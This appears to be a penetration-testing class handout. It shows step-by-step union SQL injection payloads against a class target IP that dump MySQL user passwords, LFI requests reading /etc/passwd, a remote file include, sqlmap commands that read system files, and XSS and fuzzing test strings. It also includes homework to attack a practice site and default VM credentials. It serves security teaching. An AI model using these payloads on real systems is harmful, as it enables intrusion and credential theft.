###########################################
# Advanced Web App Pentester Night School #
###########################################




#######################
# Attacking PHP/MySQL #
#######################

Go to LAMP Target homepage
http://54.172.112.249/



Clicking on the Acer Link:
http://54.172.112.249/acre2.php?lap=acer

	- Found parameter passing (answer yes to question 1)
	- Insert ' to test for SQLI

http://54.172.112.249/acre2.php?lap=acer'


Page returns the following error:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1



In order to perform union-based sql injection - we must first determine the number of columns in this query.
We do this using the ORDER BY
http://54.172.112.249/acre2.php?lap=acer' order by 100-- +

Page returns the following error:
Unknown column '100' in 'order clause'



http://54.172.112.249/acre2.php?lap=acer' order by 50-- +

Page returns the following error:
Unknown column '50' in 'order clause'



http://54.172.112.249/acre2.php?lap=acer' order by 25-- +
Page returns the following error:
Unknown column '25' in 'order clause'



http://54.172.112.249/acre2.php?lap=acer' order by 12-- +

Page returns the following error:
Unknown column '50' in 'order clause'



http://54.172.112.249/acre2.php?lap=acer' order by 6-- +
---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns



Now we build out the union all select statement with the correct number of columns

Reference:
http://www.techonthenet.com/sql/union.php



http://54.172.112.249/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +



Now we negate the parameter value 'acer' by turning into the word 'null':
http://54.172.112.249/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j

We see that a 4 and a 5 are on the screen. These are the columns that will echo back data


Use a cheat sheet for syntax:
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet


http://54.172.112.249/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j

http://54.172.112.249/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j

http://54.172.112.249/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +

http://54.172.112.249/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +


http://54.172.112.249/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a




Here we see parameter passing, but this one is actually a yes to question number 3 (reference a file)
http://54.172.112.249/showfile.php?filename=about.txt



See if you can read files on the file system:
http://54.172.112.249/showfile.php?filename=/etc/passwd

We call this attack a Local File Include or LFI.

Now let's find some text out on the internet somewhere:
http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt


Now let's append that URL to our LFI and instead of it being Local - it is now a Remote File Include or RFI:
http://54.172.112.249/showfile.php?filename=http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt


-----------------Some Automated Testing from the strategicsec VM-----------------

##################################################
# You can download the virtual machine from here #
##################################################
https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu-v3.zip
user: strategicsec
pass: strategicsec



cd /home/strategicsec/toolz/sqlmap-dev/

python sqlmap.py -u "http://54.172.112.249/acre2.php?lap=acer" -b -v 3


python sqlmap.py -u "http://54.172.112.249/acre2.php?lap=acer" --current-user -v 3


python sqlmap.py -u "http://54.172.112.249/acre2.php?lap=acer" --current-db -v 3


python sqlmap.py -u "http://54.172.112.249/acre2.php?lap=acer" --privileges -v 3


python sqlmap.py -u "http://54.172.112.249/acre2.php?lap=acer" --dbs -v 3


python sqlmap.py -u "http://54.172.112.249/acre2.php?lap=acer" --tables -v 3


python sqlmap.py -u "http://54.172.112.249/acre2.php?lap=acer" --file-read=/etc/issue -v 3


python sqlmap.py -u "http://54.172.112.249/acre2.php?lap=acer" --file-read=/etc/passwd -v 3




************************ Class Homework ************************

Perform a mock penetration test against http://54.172.112.249 using what you have learned in this pastebin.

You don't need to document it for me, but go through the steps for your own understanding.





************************ Class Challenge ************************

Let's see how you do with someone else's vulnerable website. Your 1st target is: http://zero.webappsecurity.com
 
Here are some sample web app penetration test reports from other companies that you can look at:
https://s3.amazonaws.com/StrategicSec-Files/WebAppSampleReports.zip
 
I want you to perform a penetration test against http://zero.webappsecurity.com and document the engagement as if it were a real project.







###############################################################
# Question 1: What is the process that you use when you test? #
###############################################################

Step 1: Automated Testing

Step 1a: Web Application vulnerability scanners
-----------------------------------------------
- Run two (2) unauthenticated vulnerability scans against the target
- Run two (2) authenticated vulnerability scans against the target with low-level user credentials
- Run two (2) authenticated vulnerability scans against the target with admin privileges

The web application vulnerability scanners that I use for this process are (HP Web Inspect, and Acunetix).

A good web application vulnerability scanner comparison website is here:
http://sectoolmarket.com/price-and-feature-comparison-of-web-application-scanners-unified-list.html


Look to see if there are cases where both scanners identify the same vulnerability. Investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.

When you run into cases where one (1) scanner identifies a vulnerability that the other scanner does not you should still investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.


Be sure to look for scans that take more than 3 or 4 hours as your scanner may have lost its active session and is probably not actually finding real vulnerabilities anymore.


Also, be sure to save the scan results and logs. I usually provide this data to the customer.



Step 1b: Directory Brute Forcer
-------------------------------
I like to run DirBuster or a similar tool. This is great to find hidden gems (backups of the website, information leakage, unreferenced files, dev sites, etc).



Step 2: Manual Testing

Try to do this step while your automated scans are running. Use Burp Suite or the Tamper Data Firefox extension to browse EVERY PAGE of the website (if this is realistic).

Step 2a: Spider/Scan the entire site with Burp Suite
Save the spider and scan results. I usually provide this data to the customer as well.


Step 2b: Browse through the site using the 3 question method
Have Burp Suite on with intercept turned off. Browse the website using the 3 question method that I've taught you in the past. When you find a place in the site where the answer to one of the 3 questions is yes - be sure to look at that individual web request in the target section of Burp Suite, right-click on that particular request and choose 'Send to Intruder'.

Take the appropriate fuzz list from https://github.com/fuzzdb-project/fuzzdb/ and load it into Intruder. A quick tip for each individual payload is to be sure to send the payload both with and without the parameter value.

Here is what I mean:
http://www.site.com/page.aspx?parametername=parametervalue

When you are looking at an individual request - often times Burp Suite will insert the payload in place of the parameter value like this:

http://www.site.com/page.aspx?parametername=[ payload ]

You need to ensure that you send the payload this way, and like this below:

http://www.site.com/page.aspx?parametername=parametervalue[ payload ]

This little hint will pay huge dividends in actually EXPLOITING the vulnerabilities you find instead of just identifying them.







###########################################
# Question 2: How much fuzzing is enough? #
###########################################
There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.

Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.


Step 1: Ask yourself the 3 questions per page of the site.

Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)

Step 3: When you load your fuzz strings - use the following decision tree

	- Are the fuzz strings causing a default error message (example 404)?
		- If this is the case then it is most likely NOT vulnerable

	- Are the fuzz strings causing a WAF or LB custom error message?
		- If this is the case then you need to find an encoding method to bypass


	- Are the fuzz strings causing an error message that discloses the backend type?
		- If yes, then identify DB type and find correct syntax to successfully exploit
		- Some example strings that I use are:
			'
			"
			()       	<----- Take the parameter value and put it in parenthesis
			(5-1)	 	<----- See if you can perform an arithmetic function


	- Are the fuzz strings rendering executable code?
		- If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
		- Some example strings that I use are:
			<b>hello</b>
			<u>hello</u>
			<script>alert(123);</script>
			<script>alert(xss);</script>
			<script>alert('xss');</script>
			<script>alert("xss");</script>